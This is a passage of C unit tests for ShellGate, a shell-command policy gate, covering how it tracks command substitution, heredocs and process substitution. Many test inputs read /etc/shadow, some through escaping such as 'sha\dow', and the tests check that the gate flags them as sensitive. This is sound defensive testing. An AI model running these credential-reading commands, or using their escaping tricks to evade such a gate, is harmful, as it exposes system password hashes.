           memcmp(continued.subcommands[0].netargv, netargv, netargv_length) ==
               0 &&
           continued.subcommands[0].write_count == writes &&
           continued.subcommands[0].read_count == reads);
  }
  sg_gate_free(gate);
}

TEST(dynamic_substitution_flow_contract) {
  static const char *rules[] = {
      "echo *", "sleep *", "printf *",  "printf * *", "id",  "./clock",
      "cat",    "cat *",   "cat #path", "pwd",        "date"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));

  sg_result_t result;
  ASSERT_SG_OK(
      eval_cmd(gate, "echo $( { sleep 2; printf q; } | ./clock )", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 4);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);

  /* A syntactic substitution is not automatically a live dynamic I/O flow:
   * descriptor closes and diversions can disconnect it before its bytes reach
   * a shell word or process-substitution consumer. */
  ASSERT_SG_OK(eval_cmd(gate, "echo $(printf x >&-)", &result));
  ASSERT(!result.requires_substitution_evaluation &&
         !result.has_dynamic_substitution_io);

  ASSERT_SG_OK(eval_cmd(gate, "echo $(printf x 1>&2)", &result));
  ASSERT(!result.requires_substitution_evaluation &&
         !result.has_dynamic_substitution_io);

  ASSERT_SG_OK(eval_cmd(gate, "echo $(printf x 2>&1 1>&2)", &result));
  ASSERT(result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io);

  ASSERT_SG_OK(eval_cmd(gate, "printf x > >(sh 0<&-)", &result));
  ASSERT(!result.requires_substitution_evaluation &&
         !result.has_dynamic_substitution_io);

  ASSERT_SG_OK(eval_cmd(gate, "printf x > >(sh 0<&0)", &result));
  ASSERT(!result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io);

  ASSERT_SG_OK(eval_cmd(gate, "echo $(printf first; printf second)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 3);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(gate, "echo $(<\"/etc/shadow\")", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 1);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);

  ASSERT(result.subcommands[0].read_count == 0);
  ASSERT(result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE);

  ASSERT_SG_OK(eval_cmd(gate, "echo $(</etc/shadow)", &result));
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE);

  ASSERT_SG_OK(eval_cmd(gate, "echo $(</etc/sha\\dow)", &result));
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE);

  ASSERT_SG_OK(eval_cmd(gate, "echo $(<\"$dynamic_path\")", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(!(result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE));

  ASSERT_SG_OK(eval_cmd(gate, "echo $(</tmp/direct)$(id)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 2);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(gate, "echo $(< <(printf q))", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
         result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         result.subcommands[0].requires_substitution_evaluation &&
         !result.subcommands[1].requires_substitution_evaluation);

  /* The nested printf selects a pathname, while the selected file's contents
   * are what later enter echo's shell word. Do not make the filename producer
   * itself a second-inspection consumer. */
  ASSERT_SG_OK(eval_cmd(gate, "echo $(<$(printf /tmp/dynamic-name))", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
         result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         result.subcommands[0].requires_substitution_evaluation &&
         !result.subcommands[1].requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(gate, "{ echo $(</tmp/group-input); }", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 1);

  ASSERT(result.subcommands[0].requires_substitution_evaluation);

  ASSERT_SG_OK(
      eval_cmd(gate, "echo $( { printf $(</tmp/nested-input); } )", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 2);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(result.subcommands[1].requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(gate, "printf value 2> >(cat)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(!result.requires_substitution_evaluation);
  ASSERT(result.has_dynamic_substitution_io);
  ASSERT(result.subcommand_count == 2);
  ASSERT(!result.subcommands[0].requires_substitution_evaluation);
  ASSERT(!result.subcommands[1].requires_substitution_evaluation);
  ASSERT(result.subcommands[1].has_dynamic_substitution_io);

  ASSERT_SG_OK(eval_cmd(gate, "cat <(cat <<EOF\n)\nEOF\n)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         result.subcommands[0].has_dynamic_substitution_io);

  ASSERT_SG_OK(eval_cmd(gate, "echo $(cat <<EOF\n)\nEOF\n)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
         result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         result.subcommands[0].requires_substitution_evaluation);

  /* Arithmetic shifts are not heredocs, while their enclosing substitution
   * still carries the correct shell-word or dynamic-descriptor semantics. */
  ASSERT_SG_OK(eval_cmd(gate, "echo $(printf '%s' $((1 << 2)))", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
         result.requires_substitution_evaluation &&
         result.subcommand_count == 2 &&
         result.subcommands[0].requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(gate, "cat <(printf '%s' $((1 << 2)))", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
         result.subcommands[0].has_dynamic_substitution_io);

  ASSERT_SG_OK(eval_cmd(gate, "{ echo $((1 << 2)); }", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         result.subcommand_count == 1);

  /* A substitution in a redirect selects an I/O pathname. It remains visible
   * on the redirect owner, but it is not shell-word content to inspect again.
   */
  ASSERT_SG_OK(eval_cmd(gate, "cat >$(id)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 2);
  ASSERT(result.subcommands[0].has_dynamic_substitution_io &&
         !result.subcommands[0].requires_substitution_evaluation &&
         !result.subcommands[1].has_dynamic_substitution_io &&
         !result.subcommands[1].requires_substitution_evaluation);

  ASSERT_SG_OK(
      eval_cmd(gate, "{ echo ok; } >prefix$(printf /tmp/out)suffix", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 2);
  ASSERT(!result.subcommands[0].has_dynamic_substitution_io &&
         !result.subcommands[0].requires_substitution_evaluation &&
         result.subcommands[1].has_dynamic_substitution_io &&
         !result.subcommands[1].requires_substitution_evaluation);

  /* Literal braces do not quote their contents. The substitution computes an
   * I/O pathname, so it remains visible as dynamic I/O but never becomes data
   * supplied to a shell word for another inspection. A path-forcing literal
   * prefix keeps the legacy combined-output spelling unambiguous. */
  ASSERT_SG_OK(
      eval_cmd(gate, "printf value >{$(printf /tmp/brace-output)}", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 2);
  ASSERT(result.subcommands[0].has_dynamic_substitution_io &&
         !result.subcommands[0].requires_substitution_evaluation &&
         !result.subcommands[1].has_dynamic_substitution_io &&
         !result.subcommands[1].requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(
      gate, "printf value >&path-$(printf /tmp/brace-combined)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 2);
  ASSERT(result.subcommands[0].has_dynamic_substitution_io &&
         !result.subcommands[0].requires_substitution_evaluation &&
         !result.subcommands[1].has_dynamic_substitution_io &&
         !result.subcommands[1].requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(gate, "echo $( { cat /etc/shadow; } )", &result));
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE);

  ASSERT_SG_OK(eval_cmd(gate, "cat <<EOF\n$(id)\nEOF", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 2);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(gate, "cat <<-EOF\r\n\t$(id)\r\n\tEOF\r\n", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 2);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(gate, "cat <<'EOF'\n$(id)\nEOF", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(!result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 1);
  ASSERT(!result.subcommands[0].requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(gate, "cat <<\\EOF\n$(id)\nEOF", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(!result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 1);
  ASSERT(!result.subcommands[0].requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(gate, "cat <<EOF </dev/null\n$(id)\nEOF", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 2);
  ASSERT(!result.subcommands[0].requires_substitution_evaluation);

  ASSERT_SG_OK(
      eval_cmd(gate, "cat <<A <<-B\n$(id)\nA\n\t$(pwd)\n\tB\n", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 3);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  /* The later heredoc's substitution inherits the first document on stdin. */

  ASSERT_SG_OK(
      eval_cmd(gate, "cat <<EOF\n$(printf one; printf two)\nEOF", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 3);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(gate, "cat <<EOF\n$(</etc/shadow)\nEOF", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 1);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE);
  ASSERT(result.subcommands[0].violation_type_flags & SG_VIOL_SUBST_SENSITIVE);
  bool heredoc_sensitive_owner = false;
  for (uint32_t i = 0; i < result.violation_count; i++)
    heredoc_sensitive_owner =
        heredoc_sensitive_owner ||
        (result.violations[i].type == SG_VIOL_SUBST_SENSITIVE &&
         result.violations[i].command_node_index == 0);
  ASSERT(heredoc_sensitive_owner);

  /* The heredoc is an internal transport node. The sensitive substitution
   * belongs to the GROUP-owned descriptor and must reach every simple command
   * which inherits that group context. */
  ASSERT_SG_OK(
      eval_cmd(gate, "{ cat; cat; } <<EOF\n$(</etc/shadow)\nEOF", &result));
  ASSERT(
      result.requires_substitution_evaluation && result.subcommand_count == 2 &&
      (result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE) &&
      (result.subcommands[0].violation_type_flags & SG_VIOL_SUBST_SENSITIVE) &&
      (result.subcommands[1].violation_type_flags & SG_VIOL_SUBST_SENSITIVE));

  ASSERT_SG_OK(eval_cmd(gate, "{ cat; cat; } <<EOF\n$(id)\nEOF", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 3);
  ASSERT(!result.subcommands[0].requires_substitution_evaluation);
  ASSERT(result.subcommands[1].requires_substitution_evaluation);
  ASSERT(result.subcommands[2].requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(
      gate, "cat <<EOF\n$( { sleep 2; printf q; } | ./clock )\nEOF", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommand_count == 4);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);

  sg_gate_free(gate);
}

TEST(herestring_and_transformed_substitution_provenance) {
  static const char *rules[] = {"echo *", "sh",       "cat",       "cat #path",
                                "sed *",  "printf *", "printf * *"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));

  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "sh <<< \"$(cat /etc/shadow)\"", &result));
  ASSERT(
      result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
      result.requires_substitution_evaluation &&
      (result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE) &&
      result.subcommand_count == 2 &&
      result.subcommands[0].requires_substitution_evaluation &&
      (result.subcommands[0].violation_type_flags & SG_VIOL_SUBST_SENSITIVE));

  /* Group-owned here-string data reaches its real GROUP owner, then each
   * member receives that inherited inspection and violation context. */
  ASSERT_SG_OK(eval_cmd(gate, "{ sh; cat; } <<< \"$(</etc/shadow)\"", &result));
  ASSERT(
      result.requires_substitution_evaluation &&
      (result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE) &&
      result.subcommand_count == 2 &&
      result.subcommands[0].requires_substitution_evaluation &&
      result.subcommands[1].requires_substitution_evaluation &&
      (result.subcommands[0].violation_type_flags & SG_VIOL_SUBST_SENSITIVE) &&
      (result.subcommands[1].violation_type_flags & SG_VIOL_SUBST_SENSITIVE));

  /* A preceding group here-string is transient after the explicit fd-0
   * replacement. The effective final document still carries its dynamic
   * provenance to every member through the GROUP owner. */
  ASSERT_SG_OK(eval_cmd(
      gate, "{ sh; cat; } 3>&1 <<< stale 0<<< \"$(</etc/shadow)\"", &result));
  ASSERT(
      result.requires_substitution_evaluation &&
      result.has_dynamic_substitution_io &&
      (result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE) &&
      result.subcommand_count == 2 &&
      result.subcommands[0].requires_substitution_evaluation &&
      result.subcommands[1].requires_substitution_evaluation &&
      (result.subcommands[0].violation_type_flags & SG_VIOL_SUBST_SENSITIVE) &&
      (result.subcommands[1].violation_type_flags & SG_VIOL_SUBST_SENSITIVE));

  /* A process-substitution redirect remains dynamic I/O, but the later
   * here-string's command substitution must still flag the group member that
   * receives its bytes as requiring shell-word inspection. */
  ASSERT_SG_OK(
      eval_cmd(gate, "{ sh; } > >(cat) <<< \"$(printf payload)\"", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
         result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 3 &&
         result.subcommands[2].requires_substitution_evaluation &&
         !result.subcommands[1].requires_substitution_evaluation &&
         !result.subcommands[0].requires_substitution_evaluation);

  /* Risk provenance follows real dynamic-byte transforms, rather than
   * assuming that only a direct file-reading producer can be sensitive. */
  ASSERT_SG_OK(eval_cmd(gate, "echo $(cat /etc/shadow | sed s/a/b/)", &result));
  ASSERT(result.requires_substitution_evaluation &&
         (result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE));

  ASSERT_SG_OK(
      eval_cmd(gate, "echo $(printf '%s' $(cat /etc/shadow))", &result));
  ASSERT(result.requires_substitution_evaluation &&
         (result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE));

  ASSERT_SG_OK(
      eval_cmd(gate, "echo $(cat /tmp/ordinary | sed s/a/b/)", &result));
  ASSERT(result.requires_substitution_evaluation &&
         !(result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE));
  sg_gate_free(gate);
}

TEST(substitution_sensitive_alias_worklist) {
  sg_gate_t *gate =
      gate_with_rules((const char *[]){"echo *", "true", "cat *"}, 3);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.redirect_fanout_threshold = SHELL_DEP_MAX_EDGES;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));

  for (unsigned aliases = 4; aliases <= 8; aliases += 4) {
    for (unsigned sensitive_first = 0; sensitive_first < 2; sensitive_first++) {
      char command[2048];
      size_t used = (size_t)snprintf(command, sizeof(command), "echo \"$(");
      if (sensitive_first)
        used += (size_t)snprintf(command + used, sizeof(command) - used,
                                 "cat /etc/shadow; ");
      for (unsigned i = 0; i < aliases; i++) {
        used +=
            (size_t)snprintf(command + used, sizeof(command) - used, "true");
        for (unsigned fd = 2; fd <= 16; fd++)
          used += (size_t)snprintf(command + used, sizeof(command) - used,
                                   " %u>&1", fd);
        used += (size_t)snprintf(command + used, sizeof(command) - used, "; ");
      }
      used +=
          (size_t)snprintf(command + used, sizeof(command) - used,
                           sensitive_first ? "true)\"" : "cat /etc/shadow)\"");
      ASSERT(used < sizeof(command));
      sg_result_t result;
      ASSERT_SG_OK(eval_cmd(gate, command, &result));
      ASSERT(!result.truncated && result.requires_substitution_evaluation);
      ASSERT(result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE);
    }
  }

  /* A bidirectional process pipe introduces a traversal cycle, not a second
   * worklist entry for every alias of that same resource. */
  sg_result_t result;
  ASSERT_SG_OK(
      eval_cmd(gate, "echo \"$(cat /etc/shadow 0<> >(cat))\"", &result));
  ASSERT(!result.truncated && result.requires_substitution_evaluation);
  ASSERT(result.violation_type_flags & SG_VIOL_SUBST_SENSITIVE);
  sg_gate_free(gate);
}

TEST(brace_group_process_substitution_result_contract) {
  static const char *rules[] = {"echo *", "printf *", "printf * *", "id",
                                "cat"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));

  static const struct {
    const char *command;
    uint32_t command_count;
    uint32_t dynamic_count;
    bool dynamic[4];
  } cases[] = {
      {"{ printf value; } > >(cat)", 2, 0, {false, false}},
      {"{ printf value >&3; } 3> >(cat)", 2, 0, {false, false}},
      {"{ cat; } < <(printf config)", 2, 0, {false, false}},
      {"{ echo $(id); } & printf after", 3, 1, {true, false, false}},
      {"{ echo $(id); } && printf after", 3, 1, {true, false, false}},
      {"printf before || { echo $(id); }", 3, 1, {false, true, false}},
      {"{ printf value; } 3> >(printf '%s' \"$(id)\")",
       3,
       1,
       {true, false, false}},
  };

  for (uint32_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, cases[i].command, &result));
    ASSERT(result.verdict == (cases[i].dynamic_count
                                  ? SG_VERDICT_ALLOW_CONDITIONAL
                                  : SG_VERDICT_ALLOW) &&
           result.requires_substitution_evaluation ==
               (cases[i].dynamic_count != 0) &&
           result.has_dynamic_substitution_io &&
           result.subcommand_count == cases[i].command_count);
    uint32_t dynamic_count = 0;
    for (uint32_t command = 0; command < result.subcommand_count; command++) {
      const sg_subcommand_result_t *subcommand = &result.subcommands[command];
      dynamic_count += subcommand->requires_substitution_evaluation;
      ASSERT(subcommand->requires_substitution_evaluation ==
             cases[i].dynamic[command]);
    }
    ASSERT(dynamic_count == cases[i].dynamic_count);
  }
  sg_gate_free(gate);
}

TEST(group_process_substitution_dynamic_consumer_contract) {
  static const char *rules[] = {"sh", "cat", "printf *"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));

  static const struct {
    const char *command;
    uint32_t command_count;
    bool dynamic[4];
  } cases[] = {
      {"{ sh; cat; } < <(printf payload)", 3, {false, true, true}},
      {"{ { sh; }; cat; } < <(printf payload); printf sibling",
       4,
       {false, true, true, false}},
      {"printf payload > >({ sh; })", 2, {false, true}},
      {"{ printf payload; } 3>> >(cat)", 2, {true, false}},
      {"printf source | { sh; } 3<&0 < <(printf config)",
       3,
       {false, false, true}},
      /* The inner producer inherits the outer process input before its own
       * output pipe replaces the group's input. Both consumers are real. */
      {"printf outer > >({ cat; } < <(printf inner))", 3, {false, true, true}},
  };

  for (uint32_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, cases[i].command, &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW &&
           !result.requires_substitution_evaluation &&
           result.has_dynamic_substitution_io &&
           result.subcommand_count == cases[i].command_count);
    for (uint32_t command = 0; command < result.subcommand_count; command++) {
      ASSERT(!result.subcommands[command].requires_substitution_evaluation);
      ASSERT(result.subcommands[command].has_dynamic_substitution_io ==
             cases[i].dynamic[command]);
    }
  }

  /* The inner producer is not a GROUP-edge descendant, but its execution
   * really inherits the group input while its own process pipe is created.
   * Both actual consumers must retain their dynamic-I/O flags. */
  sg_result_t result;
  ASSERT_SG_OK(
      eval_cmd(gate, "{ cat < <(printf inner); } < <(printf outer)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
         !result.requires_substitution_evaluation &&
         result.has_dynamic_substitution_io && result.subcommand_count == 3 &&
         !result.subcommands[0].has_dynamic_substitution_io &&
         result.subcommands[1].has_dynamic_substitution_io &&
         result.subcommands[2].has_dynamic_substitution_io);
  sg_gate_free(gate);
}

TEST(substitution_stream_resource_contract) {
  static const char *rules[] = {"exec", "echo *", "printf *", "printf * *",
                                "cat",  "probe",  "true",     "false"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  static const struct {
    const char *source;
    uint32_t count;
    uint32_t inspection_mask;
    uint32_t dynamic_mask;
  } cases[] = {
      {"exec 3>&1; echo \"$(printf value >&3)\"", 3, 0, 0},
      {"exec 3>&1; echo \"`printf value >&3`\"", 3, 0, 0},
      {"echo \"$(exec 3>&1; printf value >&3)\"", 3, 1, 1},
      {"echo \"$(exec 3>&1 >out; probe && exec >&3; printf value)\"", 5, 1, 1},
      {"echo \"$(exec 3>&1 >out; false && exec >&3; printf value)\"", 5, 1, 1},
      {"echo \"$(exec 3>&1 >out && { false && exec >&3; printf value; })\"", 5,
       0, 0},
      {"exec 3>&1; echo \"$(time exec 2>&3)\"", 3, 0, 0},
      {"printf source | echo \"$(cat)\"", 3, 2, 2},
      {"printf source > >(printf '%s' \"$(cat)\")", 3, 2, 6},
      {"{ echo \"$(time true)\"; } |& cat", 3, 1, 1},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
    if (result.subcommand_count != cases[i].count ||
        result.verdict != (cases[i].inspection_mask
                               ? SG_VERDICT_ALLOW_CONDITIONAL
                               : SG_VERDICT_ALLOW))
      printf("\n    stream result: %s verdict=%d commands=%u\n",
             cases[i].source, result.verdict, result.subcommand_count);
    ASSERT(result.subcommand_count == cases[i].count && !result.truncated);
    ASSERT(result.verdict == (cases[i].inspection_mask
                                  ? SG_VERDICT_ALLOW_CONDITIONAL
                                  : SG_VERDICT_ALLOW));
    ASSERT(result.requires_substitution_evaluation ==
           (cases[i].inspection_mask != 0));
    ASSERT(result.has_dynamic_substitution_io == (cases[i].dynamic_mask != 0));
    for (uint32_t command = 0; command < result.subcommand_count; command++) {
      const sg_subcommand_result_t *item = &result.subcommands[command];
      ASSERT(item->requires_substitution_evaluation ==
             ((cases[i].inspection_mask & (1u << command)) != 0));
      ASSERT(item->has_dynamic_substitution_io ==
             ((cases[i].dynamic_mask & (1u << command)) != 0));
    }
  }
  sg_gate_free(gate);
}

TEST(substitution_source_word_contract) {
  static const char *rules[] = {"echo *", "cat", "cat *", "printf *"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));

  sg_result_t result = {0};
  static const struct {
    const char *source;
    bool executes;
  } parameter_cases[] = {
      {"echo \"${x:-'$(printf hi)'}\"", true},
      {"echo \"${x:-$'$(printf hi)'}\"", true},
      {"echo \"${x:-'`printf hi`'}\"", true},
      {"echo \"${x:-'${y:-$(printf hi)}'}\"", true},
      {"echo ${x:-'$(printf hi)'}", false},
      {"echo ${x:-$'$(printf hi)'}", false},
      {"echo \"${x:-'\\$(printf hi)'}\"", false},
      {"echo \"${x:-'<(printf hi)'}\"", false},
      {"echo \"${x/a/'$(printf hi)'}\"", false},
      {"echo \"${x#'$(printf hi)'}\"", false},
      {"echo \"${x:-$'\\\\$(printf hi)'}\"", false},
      {"echo \"${x:-$'\\\\\\$(printf hi)'}\"", true},
      {"echo \"${x^$(printf hi)}\"", true},
      {"echo \"${x:-$'\\x24'}\"", false},
      {"echo \"${x:-$'\\x3c'}\"", false},
  };
  for (size_t i = 0; i < sizeof(parameter_cases) / sizeof(parameter_cases[0]);
       i++) {
    ASSERT_SG_OK(eval_cmd(gate, parameter_cases[i].source, &result));
    ASSERT(result.subcommand_count == (parameter_cases[i].executes ? 2u : 1u));
    ASSERT(result.requires_substitution_evaluation ==
           parameter_cases[i].executes);
    ASSERT(result.subcommands[0].requires_substitution_evaluation ==
           parameter_cases[i].executes);
  }

  ASSERT_SG_OK(eval_cmd(gate, "echo \"${x/a/<(printf hi)}\"", &result));
  ASSERT(result.subcommand_count == 2 && result.has_dynamic_substitution_io &&
         !result.requires_substitution_evaluation);

  ASSERT(eval_cmd(gate, "echo \"${x:-$'\\x24(printf hi)'}\"", &result) ==
         SG_ERR_PARSE);

  static const char *const unsafe_ansi[] = {
      "echo \"${x:-$'$(printf\\x20X)'}\"", "echo \"${x:-$'$(pr\\x69ntf X)'}\"",
      "echo \"${x:-$'\\\\'$(printf X)}\"", "echo \"${x:-$'\\\"$(printf X)'}\"",
      "echo \"${x:-$'\"$(printf X)'}\"",
  };
  for (size_t i = 0; i < sizeof(unsafe_ansi) / sizeof(unsafe_ansi[0]); i++) {
    ASSERT(eval_cmd(gate, unsafe_ansi[i], &result) == SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT);
  }

  ASSERT_SG_OK(eval_cmd(gate, "echo \"<(cat)foo\"", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1);
  ASSERT_STR(result.subcommands[0].netargv, "4:echo,9:<(cat)foo,");
  ASSERT(!result.has_dynamic_substitution_io);
  ASSERT(!result.requires_substitution_evaluation);

  ASSERT_SG_OK(eval_cmd(gate, "echo <(cat)foo", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 2);
  ASSERT_STR(result.subcommands[0].netargv, "4:echo,9:<(cat)foo,");
  ASSERT(result.has_dynamic_substitution_io);
  ASSERT(!result.requires_substitution_evaluation);

  /* ShellGate builds its policy netargv directly from graph words. It must
